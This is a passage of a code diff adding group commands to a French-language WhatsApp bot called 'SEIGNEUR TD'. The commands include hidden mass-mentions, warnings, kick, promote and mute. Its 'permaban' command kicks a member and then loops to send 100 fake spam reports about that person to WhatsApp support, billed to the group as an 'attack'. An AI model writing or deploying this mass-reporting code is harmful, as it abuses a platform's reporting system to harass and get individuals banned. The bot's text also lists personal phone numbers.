+          await sock.sendMessage(remoteJid, { text: `❌ Erreur: ${e.message}` });
+        }
+        break;
+      }
+
+      case 'hidetag':
+      case 'htag':
+      case 'invisibletag': {
+        if (!isGroup) {
+          await sock.sendMessage(remoteJid, { text: '❌ Groupe uniquement.' });
+          break;
+        }
+        try {
+          const metadata     = await sock.groupMetadata(remoteJid);
+          const participants = metadata.participants.map(p => p.id);
+          const tagMsg       = args.join(' ') || '';
+
+          await sock.sendMessage(remoteJid, {
+            text:     tagMsg || '⁠',
+            mentions: participants
+          });
+
+          try { await sock.sendMessage(remoteJid, { react: { text: '👻', key: message.key } }); } catch(e) {}
+        } catch(e) {
+          console.error('[hidetag]', e.message);
+          await sock.sendMessage(remoteJid, { text: `❌ Erreur: ${e.message}` });
+        }
+        break;
+      }
+
+      case 'kickall':
+        await handleKickAll(sock, remoteJid, isGroup, senderJid);
+        break;
+
+      case 'leave':
+        await handleLeave(sock, remoteJid, isGroup, senderJid);
+        break;
+
+      case 'status':
+        await sock.sendMessage(remoteJid, {
+          text: `📊 *Statut du Bot*
+
+🤖 : ${botMode}
+⌨️ Typing: ${autoTyping ? 'ON' : 'OFF'}
+🎙️ Recording: ${autoRecording ? 'ON' : 'OFF'}
+😊 React: ${autoReact ? 'ON' : 'OFF'}
+👁️ VV: ${savedViewOnce.get(senderJid)?.length || 0}
+
+👨‍💻 Votre JID:
+${senderJid}
+
+🔐 Admin: ${isAdmin(senderJid) ? '✅ OUI' : '❌ NON'}`
+        });
+        break;
+
+      case 'bible':
+        await handleBibleCommand(sock, args, remoteJid);
+        break;
+
+      case 'terms':
+      case 'termes':
+      case 'rules':
+        await handleTermsCommand(sock, remoteJid, senderJid);
+        break;
+
+      case 'dev':
+      case 'developer':
+      case 'owner':
+      case 'contact':
+        await simulateTyping(sock, remoteJid);
+        await sendWithImage(sock, remoteJid, 'dev',
+`╔═══════════════════════════════════╗
+║     👨‍💻 𝗗𝗘𝗩𝗘𝗟𝗢𝗣𝗘𝗥 𝗜𝗡𝗙𝗢     ║
+╚═══════════════════════════════════╝
+
+👑 *Lord Dev Dostoevsky* 
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+📞 *CONTACT:*
+1️⃣  wa.me/50944908407
+2️⃣  wa.me/50943981073
+3️⃣  wa.me/67078035882
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+💼 *SERVICES:*
+• Développement de bots WhatsApp
+• Scripts personnalisés
+• Support technique & consulting
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+🤖 SEIGNEUR TD v4.0.0
+✨ Made with ❤️ in Haiti `);
+        break;
+
+      case 'checkban':
+      case 'checkspam':
+      case 'bancheck':
+      case 'isbanned':
+        await handleCheckBan(sock, args, remoteJid, message, senderJid);
+        break;
+
+      // =============================================
+      // COMMANDES ANTI
+      // =============================================
+
+      case 'antilink':
+        if (!isGroup) {
+          await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
+          break;
+        }
+        
+        const isUserAdmin = await isGroupAdmin(sock, remoteJid, senderJid);
+        if (!isUserAdmin && !isAdmin(senderJid)) {
+          await sock.sendMessage(remoteJid, { text: '⛔ Admin du groupe uniquement' });
+          break;
+        }
+
+        const settings = initGroupSettings(remoteJid);
+        settings.antilink = !settings.antilink;
+        saveData();
+        
+        await sock.sendMessage(remoteJid, {
+          text: `🔗 *Anti-Link* — Statut : ${settings.antilink ? "✅ ACTIVÉ" : "❌ DÉSACTIVÉ"}`,
+          footer: '© SEIGNEUR TD',
+          buttons: [
+            {
+              buttonId: 'antilink_toggle',
+              buttonText: { displayText: '🔘 Oui / Non' },
+              type: 4,
+              nativeFlowInfo: {
+                name: 'single_select',
+                paramsJson: JSON.stringify({
+                  title: '🔗 Anti-Link',
+                  sections: [{ title: 'Action', rows: [
+                    { header: '✅', title: 'Activer', description: 'Activer Anti-Link', id: `${config.prefix}antilink on` },
+                    { header: '❌', title: 'Désactiver', description: 'Désactiver Anti-Link', id: `${config.prefix}antilink off` }
+                  ]}]
+                })
+              }
+            }
+          ],
+          headerType: 1,
+          viewOnce: true
+        });
+        break;
+
+      case 'antibot':
+        if (!isGroup) {
+          await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
+          break;
+        }
+        
+        const isUserAdminBot = await isGroupAdmin(sock, remoteJid, senderJid);
+        if (!isUserAdminBot && !isAdmin(senderJid)) {
+          await sock.sendMessage(remoteJid, { text: '⛔ Admin du groupe uniquement' });
+          break;
+        }
+
+        const settingsBot = initGroupSettings(remoteJid);
+        settingsBot.antibot = !settingsBot.antibot;
+        saveData();
+        
+        await sock.sendMessage(remoteJid, {
+          text: `🤖 *Anti-Bot* — Statut : ${settingsBot.antibot ? "✅ ACTIVÉ" : "❌ DÉSACTIVÉ"}`,
+          footer: '© SEIGNEUR TD',
+          buttons: [
+            {
+              buttonId: 'antibot_toggle',
+              buttonText: { displayText: '🔘 Oui / Non' },
+              type: 4,
+              nativeFlowInfo: {
+                name: 'single_select',
+                paramsJson: JSON.stringify({
+                  title: '🤖 Anti-Bot',
+                  sections: [{ title: 'Action', rows: [
+                    { header: '✅', title: 'Activer', description: 'Activer Anti-Bot', id: `${config.prefix}antibot on` },
+                    { header: '❌', title: 'Désactiver', description: 'Désactiver Anti-Bot', id: `${config.prefix}antibot off` }
+                  ]}]
+                })
+              }
+            }
+          ],
+          headerType: 1,
+          viewOnce: true
+        });
+        break;
+
+      case 'antitag':
+        if (!isGroup) {
+          await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
+          break;
+        }
+        
+        const isUserAdminTag = await isGroupAdmin(sock, remoteJid, senderJid);
+        if (!isUserAdminTag && !isAdmin(senderJid)) {
+          await sock.sendMessage(remoteJid, { text: '⛔ Admin du groupe uniquement' });
+          break;
+        }
+
+        const settingsTag = initGroupSettings(remoteJid);
+        settingsTag.antitag = !settingsTag.antitag;
+        saveData();
+        
+        await sock.sendMessage(remoteJid, {
+          text: `🏷️ *Anti-Tag* — Statut : ${settingsTag.antitag ? "✅ ACTIVÉ" : "❌ DÉSACTIVÉ"}`,
+          footer: '© SEIGNEUR TD',
+          buttons: [
+            {
+              buttonId: 'antitag_toggle',
+              buttonText: { displayText: '🔘 Oui / Non' },
+              type: 4,
+              nativeFlowInfo: {
+                name: 'single_select',
+                paramsJson: JSON.stringify({
+                  title: '🏷️ Anti-Tag',
+                  sections: [{ title: 'Action', rows: [
+                    { header: '✅', title: 'Activer', description: 'Activer Anti-Tag', id: `${config.prefix}antitag on` },
+                    { header: '❌', title: 'Désactiver', description: 'Désactiver Anti-Tag', id: `${config.prefix}antitag off` }
+                  ]}]
+                })
+              }
+            }
+          ],
+          headerType: 1,
+          viewOnce: true
+        });
+        break;
+
+      case 'antispam':
+        if (!isGroup) {
+          await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
+          break;
+        }
+        
+        const isUserAdminSpam = await isGroupAdmin(sock, remoteJid, senderJid);
+        if (!isUserAdminSpam && !isAdmin(senderJid)) {
+          await sock.sendMessage(remoteJid, { text: '⛔ Admin du groupe uniquement' });
+          break;
+        }
+
+        const settingsSpam = initGroupSettings(remoteJid);
+        settingsSpam.antispam = !settingsSpam.antispam;
+        saveData();
+        
+        await sock.sendMessage(remoteJid, {
+          text: `🚫 *Anti-Spam* — Statut : ${settingsSpam.antispam ? "✅ ACTIVÉ" : "❌ DÉSACTIVÉ"}`,
+          footer: '© SEIGNEUR TD',
+          buttons: [
+            {
+              buttonId: 'antispam_toggle',
+              buttonText: { displayText: '🔘 Oui / Non' },
+              type: 4,
+              nativeFlowInfo: {
+                name: 'single_select',
+                paramsJson: JSON.stringify({
+                  title: '🚫 Anti-Spam',
+                  sections: [{ title: 'Action', rows: [
+                    { header: '✅', title: 'Activer', description: 'Activer Anti-Spam', id: `${config.prefix}antispam on` },
+                    { header: '❌', title: 'Désactiver', description: 'Désactiver Anti-Spam', id: `${config.prefix}antispam off` }
+                  ]}]
+                })
+              }
+            }
+          ],
+          headerType: 1,
+          viewOnce: true
+        });
+        break;
+
+      case 'antimentiongroupe':
+      case 'antimentiongroup':
+      case 'antimentionstatus': {
+        if (!isGroup) {
+          await sock.sendMessage(remoteJid, { text: '❌ Groupe uniquement.' });
+          break;
+        }
+        const isUserAdminAMG = await isGroupAdmin(sock, remoteJid, senderJid);
+        if (!isUserAdminAMG && !isAdmin(senderJid)) {
+          await sock.sendMessage(remoteJid, { text: '⛔ Admin du groupe uniquement.' });
+          break;
+        }
+        const settingsAMG = initGroupSettings(remoteJid);
+        settingsAMG.antimentiongroupe = !settingsAMG.antimentiongroupe;
+        saveData();
+        await sock.sendMessage(remoteJid, {
+          text: `🚫 *Anti-Mention Groupe* — Statut : ${settingsAMG.antimentiongroupe ? "✅ ACTIVÉ" : "❌ DÉSACTIVÉ"}`,
+          footer: '© SEIGNEUR TD',
+          buttons: [
+            {
+              buttonId: 'antimentiongroupe_toggle',
+              buttonText: { displayText: '🔘 Oui / Non' },
+              type: 4,
+              nativeFlowInfo: {
+                name: 'single_select',
+                paramsJson: JSON.stringify({
+                  title: '🚫 Anti-Mention Groupe',
+                  sections: [{ title: 'Action', rows: [
+                    { header: '✅', title: 'Activer', description: 'Activer Anti-Mention Groupe', id: `${config.prefix}antimentiongroupe on` },
+                    { header: '❌', title: 'Désactiver', description: 'Désactiver Anti-Mention Groupe', id: `${config.prefix}antimentiongroupe off` }
+                  ]}]
+                })
+              }
+            }
+          ],
+          headerType: 1,
+          viewOnce: true
+        });
+        break;
+      }
+
+      case 'warn':
+        if (!isGroup) {
+          await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
+          break;
+        }
+        
+        const isUserAdminWarn = await isGroupAdmin(sock, remoteJid, senderJid);
+        if (!isUserAdminWarn && !isAdmin(senderJid)) {
+          await sock.sendMessage(remoteJid, { text: '⛔ Admin du groupe uniquement' });
+          break;
+        }
+
+        const mentionedWarn = message.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0];
+        if (!mentionedWarn) {
+          await sock.sendMessage(remoteJid, {
+            text: `⚠️ *Système d'avertissement*\n\nUtilisation:\n${config.prefix}warn @user raison - Avertir\n${config.prefix}resetwarn @user - Réinitialiser\n${config.prefix}warns @user - Voir les warns`
+          });
+          break;
+        }
+
+        const reason = args.slice(1).join(' ') || 'Aucune raison spécifiée';
+        const settingsWarn = initGroupSettings(remoteJid);
+        const warnCount = addWarn(remoteJid, mentionedWarn, reason);
+        
+        await sock.sendMessage(remoteJid, {
+          text: `⚠️ @${mentionedWarn.split('@')[0]} a reçu un avertissement!\n\nRaison: ${reason}\nWarnings: ${warnCount}/${settingsWarn.maxWarns}`,
+          mentions: [mentionedWarn]
+        });
+
+        if (warnCount >= settingsWarn.maxWarns) {
+          const botIsAdminWarn = await isBotGroupAdmin(sock, remoteJid);
+          if (botIsAdminWarn) {
+            await sock.groupParticipantsUpdate(remoteJid, [mentionedWarn], 'remove');
+            await sock.sendMessage(remoteJid, {
+              text: `❌ @${mentionedWarn.split('@')[0]} a été expulsé (${settingsWarn.maxWarns} warnings)`,
+              mentions: [mentionedWarn]
+            });
+            resetWarns(remoteJid, mentionedWarn);
+          }
+        }
+        break;
+
+      case 'resetwarn':
+        if (!isGroup) {
+          await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
+          break;
+        }
+        
+        const isUserAdminReset = await isGroupAdmin(sock, remoteJid, senderJid);
+        if (!isUserAdminReset && !isAdmin(senderJid)) {
+          await sock.sendMessage(remoteJid, { text: '⛔ Admin du groupe uniquement' });
+          break;
+        }
+
+        const mentionedReset = message.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0];
+        if (!mentionedReset) {
+          await sock.sendMessage(remoteJid, {
+            text: `: ${config.prefix}resetwarn @user`
+          });
+          break;
+        }
+
+        resetWarns(remoteJid, mentionedReset);
+        await sock.sendMessage(remoteJid, {
+          text: `✅ Warnings réinitialisés pour @${mentionedReset.split('@')[0]}`,
+          mentions: [mentionedReset]
+        });
+        break;
+
+      case 'warns':
+        if (!isGroup) {
+          await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
+          break;
+        }
+
+        const mentionedWarns = message.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0] || senderJid;
+        const userWarns = getWarns(remoteJid, mentionedWarns);
+        const settingsWarns = initGroupSettings(remoteJid);
+        
+        if (userWarns.length === 0) {
+          await sock.sendMessage(remoteJid, {
+            text: `✅ @${mentionedWarns.split('@')[0]} n'a aucun avertissement`,
+            mentions: [mentionedWarns]
+          });
+        } else {
+          let warnText = `⚠️ Warnings de @${mentionedWarns.split('@')[0]}\n\nTotal: ${userWarns.length}/${settingsWarns.maxWarns}\n\n`;
+          userWarns.forEach((warn, index) => {
+            const date = new Date(warn.timestamp).toLocaleString('fr-FR');
+            warnText += `${index + 1}. ${warn.reason}\n   📅 ${date}\n\n`;
+          });
+          
+          await sock.sendMessage(remoteJid, {
+            text: warnText,
+            mentions: [mentionedWarns]
+          });
+        }
+        break;
+
+      case 'acceptall':
+      case 'accept-all':
+      case 'acceptrequests':
+      case 'approuver': {
+        if(!isGroup){await sock.sendMessage(remoteJid,{text:'❌ Groupes seulement.'},{ quoted: message });break;}
+        const _isAdminAcc=await isGroupAdmin(sock,remoteJid,senderJid);
+        if(!_isAdminAcc&&!isAdmin(senderJid)){await sock.sendMessage(remoteJid,{text:'⛔ Admin requis.'},{ quoted: message });break;}
+        const _botIsAdminAcc=await isBotGroupAdmin(sock,remoteJid);
+        if(!_botIsAdminAcc){await sock.sendMessage(remoteJid,{text:'❌ Le bot doit être admin.'},{ quoted: message });break;}
+        try{
+          let _pending=[];
+          try{_pending=await sock.groupRequestParticipantsList(remoteJid);}catch(e){}
+          if(!_pending||!_pending.length){
+            const _meta=await sock.groupMetadata(remoteJid);
+            const _raw=(_meta.participants||[]).filter(p=>p.pending===true||p.request_method==='invite').map(p=>({jid:p.id}));
+            if(_raw.length)_pending=_raw;
+          }
+          if(!_pending||!_pending.length){await sock.sendMessage(remoteJid,{text:'📭 Aucune demande en attente.'},{ quoted: message });break;}
+          await sock.sendMessage(remoteJid,{text:'⏳ Acceptation de '+_pending.length+' demande(s)...'},{ quoted: message });
+          const _jids=_pending.map(p=>p.jid);
+          let _accepted=0;
+          for(let i=0;i<_jids.length;i+=20){
+            const _batch=_jids.slice(i,i+20);
+            try{await sock.groupRequestParticipantsUpdate(remoteJid,_batch,'approve');_accepted+=_batch.length;if(i+20<_jids.length)await new Promise(r=>setTimeout(r,1200));}catch(e){}
+          }
+          await sock.sendMessage(remoteJid,{text:'✅ '+_accepted+'/'+_pending.length+' demandes acceptées.'});
+        }catch(e){await sock.sendMessage(remoteJid,{text:'❌ Erreur: '+e.message},{ quoted: message });}
+        break;
+      }
+
+      case 'promote':
+        if (!isGroup) {
+          await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
+          break;
+        }
+        
+        const isUserAdminPromote = await isGroupAdmin(sock, remoteJid, senderJid);
+        if (!isUserAdminPromote && !isAdmin(senderJid)) {
+          await sock.sendMessage(remoteJid, { text: '⛔ Admin du groupe uniquement' });
+          break;
+        }
+
+        const botIsAdminPromote = await isBotGroupAdmin(sock, remoteJid);
+        if (!botIsAdminPromote) {
+          await sock.sendMessage(remoteJid, { text: '❌ Je dois être admin pour promouvoir' });
+          break;
+        }
+
+        const mentionedPromote = message.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0];
+        if (!mentionedPromote) {
+          await sock.sendMessage(remoteJid, {
+            text: `: ${config.prefix}promote @user`
+          });
+          break;
+        }
+
+        try {
+          await sock.groupParticipantsUpdate(remoteJid, [mentionedPromote], 'promote');
+          await sock.sendMessage(remoteJid, {
+            text: `👑 @${mentionedPromote.split('@')[0]} est maintenant admin!`,
+            mentions: [mentionedPromote]
+          });
+        } catch (error) {
+          await sock.sendMessage(remoteJid, { text: '❌  lors de la promotion' });
+        }
+        break;
+
+      case 'demote':
+        if (!isGroup) {
+          await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
+          break;
+        }
+        
+        const isUserAdminDemote = await isGroupAdmin(sock, remoteJid, senderJid);
+        if (!isUserAdminDemote && !isAdmin(senderJid)) {
+          await sock.sendMessage(remoteJid, { text: '⛔ Admin du groupe uniquement' });
+          break;
+        }
+
+        const botIsAdminDemote = await isBotGroupAdmin(sock, remoteJid);
+        if (!botIsAdminDemote) {
+          await sock.sendMessage(remoteJid, { text: '❌ Je dois être admin pour rétrograder' });
+          break;
+        }
+
+        const mentionedDemote = message.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0];
+        if (!mentionedDemote) {
+          await sock.sendMessage(remoteJid, {
+            text: `: ${config.prefix}demote @user`
+          });
+          break;
+        }
+
+        try {
+          await sock.groupParticipantsUpdate(remoteJid, [mentionedDemote], 'demote');
+          await sock.sendMessage(remoteJid, {
+            text: `📉 @${mentionedDemote.split('@')[0]} n'est plus admin`,
+            mentions: [mentionedDemote]
+          });
+        } catch (error) {
+          await sock.sendMessage(remoteJid, { text: '❌  lors de la rétrogradation' });
+        }
+        break;
+
+      case 'add':
+        if (!isGroup) {
+          await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
+          break;
+        }
+        
+        const isUserAdminAdd = await isGroupAdmin(sock, remoteJid, senderJid);
+        if (!isUserAdminAdd && !isAdmin(senderJid)) {
+          await sock.sendMessage(remoteJid, { text: '⛔ Admin du groupe uniquement' });
+          break;
+        }
+
+        const botIsAdminAdd = await isBotGroupAdmin(sock, remoteJid);
+        if (!botIsAdminAdd) {
+          await sock.sendMessage(remoteJid, { text: '❌ Je dois être admin pour ajouter des membres' });
+          break;
+        }
+
+        if (args.length === 0) {
+          await sock.sendMessage(remoteJid, {
+            text: `: ${config.prefix}add 33612345678`
+          });
+          break;
+        }
+
+        const numberToAdd = args[0].replace(/[^0-9]/g, '');
+        if (numberToAdd.length < 10) {
+          await sock.sendMessage(remoteJid, { text: '❌ Numéro invalide' });
+          break;
+        }
+
+        try {
+          const jidToAdd = `${numberToAdd}@s.whatsapp.net`;
+          await sock.groupParticipantsUpdate(remoteJid, [jidToAdd], 'add');
+          await sock.sendMessage(remoteJid, {
+            text: `✅ @${numberToAdd} a été ajouté au groupe`,
+            mentions: [jidToAdd]
+          });
+        } catch (error) {
+          await sock.sendMessage(remoteJid, { 
+            text: `❌ Unable d'ajouter ce numéro\nVérifiez:\n- Le numéro est correct\n- La personne n'a pas quitté récemment\n- Les paramètres de confidentialité` 
+          });
+        }
+        break;
+
+      case 'kick':
+        if (!isGroup) {
+          await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
+          break;
+        }
+        
+        const isUserAdminKick = await isGroupAdmin(sock, remoteJid, senderJid);
+        if (!isUserAdminKick && !isAdmin(senderJid)) {
+          await sock.sendMessage(remoteJid, { text: '⛔ Admin du groupe uniquement' });
+          break;
+        }
+
+        const botIsAdminKick = await isBotGroupAdmin(sock, remoteJid);
+        if (!botIsAdminKick) {
+          await sock.sendMessage(remoteJid, { text: '❌ Je dois être admin pour expulser' });
+          break;
+        }
+
+        const mentionedKick = message.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0];
+        if (!mentionedKick) {
+          await sock.sendMessage(remoteJid, {
+            text: `: ${config.prefix}kick @user`
+          });
+          break;
+        }
+
+        try {
+          await sock.groupParticipantsUpdate(remoteJid, [mentionedKick], 'remove');
+          await sock.sendMessage(remoteJid, {
+            text: `👢 @${mentionedKick.split('@')[0]} a été expulsé`,
+            mentions: [mentionedKick]
+          });
+        } catch (error) {
+          await sock.sendMessage(remoteJid, { text: '❌  lors de l\'expulsion' });
+        }
+        break;
+
+      case 'permaban':
+        if (!isGroup) {
+          await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
+          break;
+        }
+        
+        const isUserAdminPermaBan = await isGroupAdmin(sock, remoteJid, senderJid);
+        if (!isUserAdminPermaBan && !isAdmin(senderJid)) {
+          await sock.sendMessage(remoteJid, { text: '⛔ Admin du groupe uniquement' });
+          break;
+        }
+
+        const botIsAdminPermaBan = await isBotGroupAdmin(sock, remoteJid);
+        if (!botIsAdminPermaBan) {
+          await sock.sendMessage(remoteJid, { text: '❌ Je dois être admin pour bannir' });
+          break;
+        }
+
+        const mentionedBan = message.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0];
+        if (!mentionedBan) {
+          await sock.sendMessage(remoteJid, {
+            text: `⚠️ *PERMABAN - Bannissement Permanent*\n\nUtilisation:\n${config.prefix}permaban @user raison\n\nCette personne sera:\n• Expulsée du groupe\n• Signalée 100 fois à WhatsApp\n• Bloquée de rejoindre le groupe\n\n⚠️ : Cette action est irréversible pour le signalement!\n\nCommandes liées:\n${config.prefix}unpermaban @user - Retirer le ban\n${config.prefix}banlist - Voir la liste des bannis`
+          });
+          break;
+        }
+
+        const banReason = args.slice(1).join(' ') || 'Comportement inapproprié';
+        
+        // Vérifier si déjà banni
+        if (isPermaBanned(remoteJid, mentionedBan)) {
+          await sock.sendMessage(remoteJid, {
+            text: `⚠️ @${mentionedBan.split('@')[0]} est déjà banni définitivement!`,
+            mentions: [mentionedBan]
+          });
+          break;
+        }
+
+        try {
+          // Message d'avertissement
+          await sock.sendMessage(remoteJid, {
+            text: `╔═══════════════════════════════════╗
+║    ⚠️ 𝗣𝗘𝗥𝗠𝗔𝗕𝗔𝗡 𝗔𝗖𝗧𝗜𝗩𝗔𝗧𝗘𝗗   ║
+╚═══════════════════════════════════╝
+
+🎯 : @${mentionedBan.split('@')[0]}
+📝 Raison: ${banReason}
+⚡ Action: Expulsion + Signalement massif
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+⏳ Initialisation de l'attaque...
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`,
+            mentions: [mentionedBan]
+          });
+
+          await delay(2000);
+
+          // Expulser la personne
+          await sock.groupParticipantsUpdate(remoteJid, [mentionedBan], 'remove');
+          
+          // Ajouter au permaban
+          addPermaBan(remoteJid, mentionedBan, banReason, senderJid);
+          
+          // Message de progression
+          const progressMsg = await sock.sendMessage(remoteJid, {
+            text: `⚡ *SIGNALEMENT EN COURS*\n\n📊 Progression: 0/100\n🎯 : @${mentionedBan.split('@')[0]}\n\n⏳ Please patienter...`,
+            mentions: [mentionedBan]
+          });
+
+          // SIGNALEMENT MASSIF - 100 fois
+          let reportCount = 0;
+          const totalReports = 100;
+          const batchSize = 10; // Signaler par batch de 10
+
+          for (let i = 0; i < totalReports; i += batchSize) {
+            try {
+              // Batch de 
+              for (let j = 0; j < batchSize && (i + j) < totalReports; j++) {
+                try {
+                  // Envoyer le signalement à WhatsApp
+                  await sock.sendMessage('support@s.whatsapp.net', {
+                    text: `Report spam from ${mentionedBan}`
+                  });
+                  
+                  reportCount++;
+                } catch (report) {
+                  console.error(' sending report:', report);
+                }
+              }
+
+              // Mise à jour de la progression toutes les 20 reports
+              if (reportCount % 20 === 0 || reportCount === totalReports) {
+                const percentage = Math.floor((reportCount / totalReports) * 100);
+                const progressBar = '█'.repeat(Math.floor(percentage / 5)) + '░'.repeat(20 - Math.floor(percentage / 5));
+                
+                await sock.sendMessage(remoteJid, {
+                  text: `⚡ *SIGNALEMENT EN COURS*\n\n📊 Progression: ${reportCount}/${totalReports}\n[${progressBar}] ${percentage}%\n🎯 : @${mentionedBan.split('@')[0]}\n\n${reportCount === totalReports ? '✅ TERMINÉ!' : '⏳ ...'}`,
+                  mentions: [mentionedBan],
+                  edit: progressMsg.key
+                });
+              }
+
+              // Délai pour éviter le rate limit
+              if (i + batchSize < totalReports) {
+                await delay(500);
+              }
+            } catch (error) {
+              console.error(' in report batch:', error);
+            }
+          }
+
+          // Message final
+          await sock.sendMessage(remoteJid, {
+            text: `╔═══════════════════════════════════╗
+║   ✅ 𝗣𝗘𝗥𝗠𝗔𝗕𝗔𝗡 𝗖𝗢𝗠𝗣𝗟𝗘𝗧   ║
+╚═══════════════════════════════════╝
+
+🎯 *:* @${mentionedBan.split('@')[0]}
+📝 *Raison:* ${banReason}
+👤 *Par:* @${senderJid.split('@')[0]}
+📅 *Date:* ${new Date().toLocaleString('fr-FR')}
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+✅ *ACTIONS EFFECTUÉES:*
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+1️⃣ Expulsion du groupe
+2️⃣ ${reportCount}  envoyés à WhatsApp
+3️⃣ Bannissement permanent activé
+
+⚠️ Cette personne sera automatiquement expulsée si elle rejoint à nouveau.
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+    𝗖𝗬𝗕𝗘𝗥𝗧𝗢𝗝𝗜 𝗫𝗠𝗗
+  "You remember me?"`,
+            mentions: [mentionedBan, senderJid]
+          });
+          
+          console.log(`✅ Permaban + ${reportCount} reports appliqués: ${mentionedBan} dans ${remoteJid}`);
+        } catch (error) {
+          console.error(' in permaban:', error);
+          await sock.sendMessage(remoteJid, { 
+            text: '❌  lors du bannissement. La personne a peut-être déjà quitté le groupe.' 
+          });
+        }
+        break;
+
+      case 'unpermaban':
+        if (!isGroup) {
+          await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
+          break;
+        }
+        
+        const isUserAdminUnBan = await isGroupAdmin(sock, remoteJid, senderJid);
+        if (!isUserAdminUnBan && !isAdmin(senderJid)) {
+          await sock.sendMessage(remoteJid, { text: '⛔ Admin du groupe uniquement' });
+          break;
+        }
+
+        const mentionedUnBan = message.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0];
+        if (!mentionedUnBan) {
+          await sock.sendMessage(remoteJid, {
+            text: `: ${config.prefix}unpermaban @user`
+          });
+          break;
+        }
+
+        if (!isPermaBanned(remoteJid, mentionedUnBan)) {
+          await sock.sendMessage(remoteJid, {
+            text: `ℹ️ @${mentionedUnBan.split('@')[0]} n'est pas banni.`,
+            mentions: [mentionedUnBan]
+          });
+          break;
+        }
+
+        const banInfo = getPermaBanInfo(remoteJid, mentionedUnBan);
+        removePermaBan(remoteJid, mentionedUnBan);
+        
+        await sock.sendMessage(remoteJid, {
+          text: `✅ *PERMABAN RETIRÉ*\n\n@${mentionedUnBan.split('@')[0]} peut à nouveau rejoindre le groupe.\n\nBanni depuis: ${new Date(banInfo.timestamp).toLocaleString('fr-FR')}\nRaison du ban: ${banInfo.reason}\nRetiré par: @${senderJid.split('@')[0]}`,
+          mentions: [mentionedUnBan, senderJid]
+        });
+        
+        console.log(`✅ Permaban retiré: ${mentionedUnBan} dans ${remoteJid}`);
+        break;
+
+      case 'banlist':
+        if (!isGroup) {
+          await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
+          break;
+        }
+
+        const groupBans = getAllPermaBans(remoteJid);
+        
+        if (groupBans.length === 0) {
+          await sock.sendMessage(remoteJid, {
+            text: '✅ Aucune personne bannie dans ce groupe.'
+          });
+          break;
+        }
+
+        let banListText = `╔═══════════════════════════════════╗
+║     🚫 𝗟𝗜𝗦𝗧𝗘 𝗗𝗘𝗦 𝗕𝗔𝗡𝗦     ║
+╚═══════════════════════════════════╝
+
+📊 Total: ${groupBans.length} personne(s) bannie(s)
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+`;
+
+        groupBans.forEach((ban, index) => {
+          const date = new Date(ban.timestamp).toLocaleDateString('fr-FR');
+          banListText += `\n${index + 1}. @${ban.userJid.split('@')[0]}\n`;
+          banListText += `   📝 Raison: ${ban.reason}\n`;
+          banListText += `   📅 Date: ${date}\n`;
+          banListText += `   👤 Par: @${ban.bannedBy.split('@')[0]}\n`;
+        });
+
+        banListText += `\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
+        banListText += `💡 Utilisez ${config.prefix}unpermaban @user pour retirer un ban`;
+
+        const mentions = groupBans.flatMap(ban => [ban.userJid, ban.bannedBy]);
+
+        await sock.sendMessage(remoteJid, {
+          text: banListText,
+          mentions: mentions
+        });
+        break;
+
+      // =============================================
+      // NOUVELLES COMMANDES GROUPE
+      // =============================================
+
+      case 'mute':
+        if (!isGroup) {
+          await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
+          break;
+        }
+        
+        const isUserAdminMute = await isGroupAdmin(sock, remoteJid, senderJid);
+        if (!isUserAdminMute && !isAdmin(senderJid)) {
+          await sock.sendMessage(remoteJid, { text: '⛔ Admin du groupe uniquement' });
+          break;
+        }
+
+        const botIsAdminMute = await isBotGroupAdmin(sock, remoteJid);
+        if (!botIsAdminMute) {
+          await sock.sendMessage(remoteJid, { text: '❌ Je dois être admin pour mute' });
+          break;
+        }
+
+        try {
+          await sock.groupSettingUpdate(remoteJid, 'announcement');
+          await sock.sendMessage(remoteJid, {
+            text: '🔇 Groupe en mode *MUET*\n\nSeuls les admins peuvent envoyer des messages.'
+          });
+        } catch (error) {
+          await sock.sendMessage(remoteJid, { text: '❌  lors du mute' });
+        }
+        break;
+
+      case 'unmute':
+        if (!isGroup) {
+          await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
+          break;
+        }
+        
+        const isUserAdminUnmute = await isGroupAdmin(sock, remoteJid, senderJid);
+        if (!isUserAdminUnmute && !isAdmin(senderJid)) {
+          await sock.sendMessage(remoteJid, { text: '⛔ Admin du groupe uniquement' });
+          break;
+        }
+
+        const botIsAdminUnmute = await isBotGroupAdmin(sock, remoteJid);
+        if (!botIsAdminUnmute) {
+          await sock.sendMessage(remoteJid, { text: '❌ Je dois être admin pour unmute' });
+          break;
+        }
+
+        try {
+          await sock.groupSettingUpdate(remoteJid, 'not_announcement');
+          await sock.sendMessage(remoteJid, {
+            text: '🔊 Groupe en mode *OUVERT*\n\nTout le monde peut envoyer des messages.'
+          });
+        } catch (error) {
